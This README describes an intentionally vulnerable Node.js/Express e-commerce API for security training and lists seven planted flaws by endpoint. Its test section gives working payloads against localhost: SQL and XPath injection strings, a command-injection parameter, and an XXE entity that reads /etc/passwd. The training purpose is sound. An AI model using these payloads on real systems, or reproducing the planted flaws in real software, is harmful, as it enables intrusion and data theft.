# E-commerce API - Test Subject 1

## ⚠️ SECURITY WARNING
This application **intentionally contains 7 security vulnerabilities** for security testing and educational purposes:
- 1 SQL Injection
- 3 OS Command Injections
- 2 XXE (XML External Entity) Injections
- 1 XPath Injection

**DO NOT** deploy this to production environments or expose it to the internet!

## Description
A comprehensive e-commerce REST API with 45+ endpoints covering authentication, product management, shopping cart, orders, reviews, wishlist, and payment processing.

**Contains 7 intentional security vulnerabilities:**
- 1 SQL Injection vulnerability
- 3 OS Command Injection vulnerabilities  
- 2 XXE (XML External Entity) Injection vulnerabilities
- 1 XPath Injection vulnerability

```
┌─────────────────────────────────────────────────────────────┐
│                  E-commerce API Application                  │
│                     (test-subject-1)                         │
├─────────────────────────────────────────────────────────────┤
│                                                              │
│  🔴 CRITICAL VULNERABILITIES (4)                            │
│  ├─ SQL Injection          → /api/products/search           │
│  ├─ OS Command Injection 1 → /api/admin/system-info         │
│  ├─ OS Command Injection 2 → /api/admin/export-logs         │
│  └─ OS Command Injection 3 → /api/admin/backup              │
│                                                              │
│  🟡 HIGH VULNERABILITIES (3)                                │
│  ├─ XXE Injection 1        → /api/reports/upload-sales      │
│  ├─ XXE Injection 2        → /api/reports/import-products   │
│  └─ XPath Injection        → /api/search/users              │
│                                                              │
│  ✅ SECURE ENDPOINTS (35+)                                  │
│  └─ Authentication, Cart, Orders, Reviews, etc.             │
│                                                              │
└─────────────────────────────────────────────────────────────┘
```

## Intentional Vulnerabilities

### 1. SQL Injection
**Location**: `/api/products/search`  
**Type**: String concatenation in SQL queries  
**Impact**: Database compromise, data theft

### 2-4. OS Command Injection (3 endpoints)
**Locations**: 
- `/api/admin/system-info` - System information endpoint
- `/api/admin/export-logs` - Log export functionality
- `/api/admin/backup` - Database backup creation

**Type**: Unsanitized user input in shell commands  
**Impact**: Remote code execution, system compromise

### 5-6. XXE Injection (2 endpoints)
**Locations**:
- `/api/reports/upload-sales` - Sales report XML upload
- `/api/reports/import-products` - Product XML import

**Type**: External entity processing enabled in XML parsers  
**Impact**: File disclosure, SSRF, denial of service

### 7. XPath Injection
**Location**: `/api/search/users`  
**Type**: Unsanitized input in XPath queries  
**Impact**: Data extraction, authentication bypass

See `ALL_VULNERABILITIES.md` for detailed exploitation examples.

## Technology Stack
- **Backend**: Node.js + Express.js
- **Database**: MySQL 8.0
- **Authentication**: JWT (JSON Web Tokens)
- **Password Hashing**: bcrypt

## API Endpoints (45+ routes)

### Authentication (3 routes)
- `POST /api/auth/register` - Register new user
- `POST /api/auth/login` - Login and get JWT token
- `GET /api/auth/me` - Get current user profile

### Products (6 routes)
- `GET /api/products` - Get all products (paginated)
- `GET /api/products/search` - **VULNERABLE** Search products
- `GET /api/products/:id` - Get product by ID
- `POST /api/products` - Create product (admin only)
- `PUT /api/products/:id` - Update product (admin only)
- `DELETE /api/products/:id` - Delete product (admin only)

### Categories (3 routes)
- `GET /api/categories` - Get all categories
- `GET /api/categories/:id` - Get category by ID
- `POST /api/categories` - Create category (admin only)

### Cart (5 routes)
- `GET /api/cart` - Get user's cart
- `POST /api/cart/items` - Add item to cart
- `PUT /api/cart/items/:productId` - Update cart item quantity
- `DELETE /api/cart/items/:productId` - Remove item from cart
- `DELETE /api/cart` - Clear cart

### Orders (3 routes)
- `GET /api/orders` - Get user's orders
- `GET /api/orders/:id` - Get order details
- `POST /api/orders` - Create order from cart
- `PATCH /api/orders/:id/status` - Update order status (admin only)

### Users (3 routes)
- `GET /api/users` - Get all users (admin only)
- `PUT /api/users/profile` - Update user profile
- `PUT /api/users/password` - Change password

### Reviews (3 routes)
- `GET /api/reviews/product/:productId` - Get product reviews
- `POST /api/reviews` - Create review
- `DELETE /api/reviews/:id` - Delete review

### Wishlist (3 routes)
- `GET /api/wishlist` - Get user's wishlist
- `POST /api/wishlist` - Add to wishlist
- `DELETE /api/wishlist/:productId` - Remove from wishlist

### Addresses (4 routes)
- `GET /api/addresses` - Get user's addresses
- `POST /api/addresses` - Add address
- `PUT /api/addresses/:id` - Update address
- `DELETE /api/addresses/:id` - Delete address

### Payment Methods (3 routes)
- `GET /api/payments/methods` - Get payment methods
- `POST /api/payments/methods` - Add payment method
- `DELETE /api/payments/methods/:id` - Delete payment method

### Admin (3 routes - VULNERABLE)
- `GET /api/admin/system-info` - **OS Command Injection #1**
- `POST /api/admin/export-logs` - **OS Command Injection #2**
- `POST /api/admin/backup` - **OS Command Injection #3**

### Reports (2 routes - VULNERABLE)
- `POST /api/reports/upload-sales` - **XXE Injection #1**
- `POST /api/reports/import-products` - **XXE Injection #2**

### Search (2 routes - VULNERABLE)
- `GET /api/search/users` - **XPath Injection**
- `GET /api/search/users/xml` - View XML data

### System (2 routes)
- `GET /health` - Health check
- `GET /` - API info

## Setup Instructions

### Prerequisites
- Docker and Docker Compose installed

### Quick Start
```bash
# Clone or navigate to the project directory
cd machines/test-subject-1

# Start the services
docker-compose up -d

# Wait for services to be ready (about 30 seconds)
# The database will be automatically initialized with sample data
```

### Manual Setup (without Docker)
```bash
# Install dependencies
npm install

# Configure environment
cp .env.example .env
# Edit .env with your database credentials

# Initialize database
npm run init-db

# Start the server
npm start
```

## Testing the Vulnerabilities

### Quick Test Examples

#### SQL Injection
```bash
# Get all products
curl "http://localhost:3000/api/products/search?query=test' OR '1'='1"
```

#### OS Command Injection
```bash
# Login as admin first, then:
TOKEN="your_admin_token"
curl -H "Authorization: Bearer $TOKEN" \
  "http://localhost:3000/api/admin/system-info?command=whoami"
```

#### XXE Injection
```bash
TOKEN="your_admin_token"
curl -X POST http://localhost:3000/api/reports/upload-sales \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"xmlData": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><salesReport><reportName>&xxe;</reportName><period>Q1</period><totalSales>1000</totalSales></salesReport>"}'
```

#### XPath Injection
```bash
TOKEN="your_token"
curl -H "Authorization: Bearer $TOKEN" \
  "http://localhost:3000/api/search/users?username=admin' or '1'='1"
```

See `ALL_VULNERABILITIES.md` for comprehensive exploitation examples and payloads.

## Sample API Usage

### Register a User
```bash
curl -X POST http://localhost:3000/api/auth/register \
  -H "Content-Type: application/json" \
  -d '{
    "email": "user@example.com",
    "password": "password123",
    "firstName": "John",
    "lastName": "Doe",
    "phone": "1234567890"
  }'
```

### Login
```bash
curl -X POST http://localhost:3000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{
    "email": "user@example.com",
    "password": "password123"
  }'
```

### Add to Cart (requires JWT token)
```bash
curl -X POST http://localhost:3000/api/cart/items \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer YOUR_JWT_TOKEN" \
  -d '{
    "productId": 1,
    "quantity": 2
  }'
```

## Database Schema

The application includes the following tables:
- `users` - User accounts
- `categories` - Product categories
- `products` - Product catalog
- `cart_items` - Shopping cart items
- `orders` - Customer orders
- `order_items` - Order line items
- `reviews` - Product reviews
- `wishlist` - User wishlists
- `addresses` - Shipping addresses
- `payment_methods` - Saved payment methods

## Environment Variables

See `.env.example` for all configuration options:
- Database connection settings
- JWT secret and expiration
- Server port and environment

## Notes

- Default admin credentials can be created manually through database
- Sample data includes 10 products across 5 categories
- JWT tokens expire after 24 hours by default
- All passwords are hashed using bcrypt
- The SQL injection vulnerability is in the search endpoint only

## Security Testing Recommendations

This application is designed for:
- Security training and education
- Penetration testing practice
- Vulnerability assessment demonstrations
- Secure code review exercises
- Testing security tools and scanners

## Documentation Files

- **README.md** - Application overview and quick start (this file)
- **ALL_VULNERABILITIES.md** - Complete vulnerability documentation with exploitation examples
- **VULNERABILITIES_SUMMARY.md** - Quick reference guide and impact summary
- **SAMPLE_PAYLOADS.md** - Ready-to-use attack payloads for each vulnerability
- **SETUP_GUIDE.md** - Detailed setup and testing instructions
- **PROJECT_STRUCTURE.md** - Complete project organization and file descriptions
- **test-vulnerabilities.sh** - Automated testing script

## Quick Reference

### Start the Application
```bash
docker-compose up -d
```

### Test a Vulnerability
```bash
# SQL Injection (no auth required)
curl "http://localhost:3000/api/products/search?query=test'%20OR%20'1'='1"
```

### Run All Tests
```bash
chmod +x test-vulnerabilities.sh
./test-vulnerabilities.sh
```

### Stop the Application
```bash
docker-compose down
```

**Remember**: This is intentionally vulnerable software. Never expose it to the internet or use it in production!
